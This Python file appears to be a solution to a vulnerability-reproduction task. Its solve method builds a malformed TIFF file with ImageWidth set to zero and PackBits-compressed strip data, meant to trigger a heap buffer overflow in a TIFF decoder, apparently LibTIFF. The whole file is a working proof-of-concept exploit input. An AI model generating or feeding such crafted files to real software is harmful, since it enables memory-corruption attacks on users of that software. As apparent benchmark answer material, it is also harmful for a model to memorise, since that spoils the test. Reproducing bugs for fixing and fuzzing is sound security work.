import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow vulnerability.
        The vulnerability is caused by zero width/height images not being checked properly.
        We generate a valid TIFF file with ImageWidth=0 and PackBits compression.
        This often causes an allocation of size 0, followed by a write from the decompressor.
        """
        
        # TIFF Header (Little Endian)
        # Magic: II (0x4949)
        # Version: 42 (0x002A)
        # Offset to first IFD: 8
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # Strip Data (PackBits Compressed)
        # Opcode 0x00: Literal run of 1 byte
        # Value 0xCC: The byte value
        # This ensures that if the decoder executes, it attempts to write 1 byte to the buffer.
        strip_data = b'\x00\xCC'
        
        entries = []
        
        # 256: ImageWidth = 0 (Vulnerability Trigger)
        entries.append(struct.pack('<HHII', 256, 3, 1, 0))
        
        # 257: ImageLength = 1
        entries.append(struct.pack('<HHII', 257, 3, 1, 1))
        
        # 258: BitsPerSample = 8
        entries.append(struct.pack('<HHII', 258, 3, 1, 8))
        
        # 259: Compression = 32773 (PackBits)
        entries.append(struct.pack('<HHII', 259, 3, 1, 32773))
        
        # 262: PhotometricInterpretation = 1 (BlackIsZero)
        entries.append(struct.pack('<HHII', 262, 3, 1, 1))
        
        # 277: SamplesPerPixel = 1
        entries.append(struct.pack('<HHII', 277, 3, 1, 1))
        
        # 278: RowsPerStrip = 1
        entries.append(struct.pack('<HHII', 278, 4, 1, 1))
        
        # 279: StripByteCounts = len(strip_data)
        entries.append(struct.pack('<HHII', 279, 4, 1, len(strip_data)))
        
        # 273: StripOffsets. 
        # Calculated based on: Header(8) + NumEntries(2) + Entries(12*9) + NextIFD(4)
        # Total entries will be 9 (including StripOffsets).
        # Offset = 8 + 2 + 108 + 4 = 122
        offset_to_data = 8 + 2 + (len(entries) + 1) * 12 + 4
        entries.append(struct.pack('<HHII', 273, 4, 1, offset_to_data))
        
        # Sort entries by Tag ID (Required by some strict parsers, though LibTIFF is lenient)
        entries.sort(key=lambda x: struct.unpack('<H', x[:2])[0])
        
        # Build IFD
        num_entries = len(entries)
        ifd = struct.pack('<H', num_entries) + b''.join(entries) + struct.pack('<I', 0)
        
        # Return complete TIFF binary
        return header + ifd + strip_data